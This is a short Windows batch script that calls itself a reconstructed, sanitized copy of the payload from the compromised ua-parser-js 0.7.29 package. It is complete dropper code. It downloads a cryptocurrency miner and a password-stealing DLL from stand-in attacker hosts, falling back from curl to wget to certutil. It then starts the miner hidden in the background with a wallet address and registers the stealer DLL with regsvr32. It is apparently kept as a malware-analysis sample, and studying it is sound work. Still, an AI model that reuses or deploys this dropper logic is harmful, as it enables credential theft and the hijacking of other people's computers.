@echo off
:: ua-parser-js@0.7.29 — Windows payload (reconstructed, sanitized)
:: Downloads XMRig miner + DanaBot password stealer DLL
:: Original C2: 159.148.186.228 + citationsherbe.at → replaced with RFC 5737/example.com
curl http://198.51.100.1/download/jsextension.exe -o jsextension.exe
if not exist jsextension.exe (
    wget http://198.51.100.1/download/jsextension.exe -O jsextension.exe
)
if not exist jsextension.exe (
    certutil.exe -urlcache -f http://198.51.100.1/download/jsextension.exe jsextension.exe
)
curl https://evil.example.com/sdd.dll -o create.dll
if not exist create.dll (
    wget https://evil.example.com/sdd.dll -O create.dll
)
if not exist create.dll (
    certutil.exe -urlcache -f https://evil.example.com/sdd.dll create.dll
)
set exe_1=jsextension.exe
set "count_1=0"
>tasklist.temp (
    tasklist /NH /FI "IMAGENAME eq %exe_1%"
)
for /f %%x in (tasklist.temp) do (
    if "%%x" EQU "%exe_1%" set /a count_1+=1
)
if %count_1% EQU 0 (start /B .\jsextension.exe -k --tls --rig-id q -o pool.evil.example.com:443 -u 49ay9Aq2r3diJtEk3eeKKm7pc5R39AKnbYJZVqAd1UUmew6ZPX1ndfXQCT16v4trWp4erPyXtUQZTHGjbLXWQdBqLMxxYKH --cpu-max-threads-hint=50 --donate-level=1 --background & regsvr32.exe -s create.dll)
del tasklist.temp
